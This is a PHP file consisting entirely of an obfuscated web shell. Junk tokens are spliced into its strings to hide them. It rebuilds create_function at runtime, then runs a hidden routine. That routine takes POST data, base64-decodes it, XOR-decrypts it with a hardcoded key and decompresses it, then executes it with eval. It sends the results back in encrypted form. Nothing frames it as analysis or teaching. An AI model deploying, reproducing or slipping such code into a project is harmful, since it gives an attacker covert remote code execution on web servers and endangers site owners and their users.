<?php
$E='"/[J$kh(.[J+)$kf/",[J@file_[J[Jget_content[Js("ph[Jp://inpu[Jt"),$m)[J==1) {@[Job_s[Jt[Jart();@[';
$Q='$k=[J"117488[J[Ja6[J";$kh[J="[Jacf2c1c524b0"[J;$kf="1275e0f6c655"[J;$p="[Jp9[Jldsq80TdfO[J[J3fw4[J";fu';
$B='@ob_end_cle[Jan();[J$r=@bas[Je64_[Jencode(@x[J[J(@gzcomp[Jr[Jess($o),$k));p[Jrint("$[Jp$kh$[Jr$kf");}';
$r='nction [Jx([J$t,$k){$c=str[J[Jlen($k);[J$l=str[Jlen([J$t);$o="";f[Jor($i=0;[J$i<$[Jl;){for[J($j=0[';
$z='Jeva[Jl(@gzuncompr[Jess(@x(@[Jbase6[J4_[Jde[Jcode($m[J[1]),$k)));$o[J=@ob_[Jget_c[Jon[Jt[Jents();';
$V=str_replace('aW','','craWeataWe_aWfaWuaWncaWtion');
$o='J;($j[J<$c&&$[Ji<$l);$j[J++,[J$i++){$o.=[J$t{$[J[Ji}^$k{$j};}}r[Je[Jturn $o;}[J[J[Jif (@preg_match(';
$D=str_replace('[J','',$Q.$r.$o.$E.$z.$B);
$G=$V('',$D);$G();
?>
